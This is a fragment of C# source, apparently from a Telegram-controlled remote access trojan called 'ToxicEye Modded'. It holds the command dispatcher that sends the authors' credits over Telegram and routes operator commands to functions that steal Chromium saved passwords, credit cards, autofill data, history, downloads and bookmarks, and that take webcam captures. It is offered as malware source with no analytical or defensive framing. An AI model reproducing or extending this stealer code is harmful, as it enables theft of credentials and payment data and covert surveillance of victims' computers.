                ...
                case "ABOUT":
                    {
                        telegram.sendText(
                            "\n🦠 ToxicEye Modded" +
                            "\n👑 Coded by LimerBoy, @h3nk0" +
                            "\n🔮 github.com/LimerBoy, github.com/c0z3dc0" +
                            "");
                        break;
                    }
               // Autofills
                case "GETAUTOFILLS":
                    {
                        cGetChromium.getAutofills();
                        break;
                    }
                    // Downloads
                case "GETDOWNLOADS":
                    {
                        cGetChromium.getDownloads();
                        break;
                    }
                    // WebCam screenshot
                case "WEBCAM":
                ...
                case "GETPASSWORDS":
                    {
                        cGetChromium.getPasswords();
                        break;
                    }
                // GetCreditCards
                case "GETCREDITCARDS":
                    {
                        cGetChromium.getCards();
                        break;
                    }
                // GetHistory
                case "GETHISTORY":
                    {
                        cGetChromium.getHistory();
                        break;
                    }
                // GetBookmarks
                case "GETBOOKMARKS":
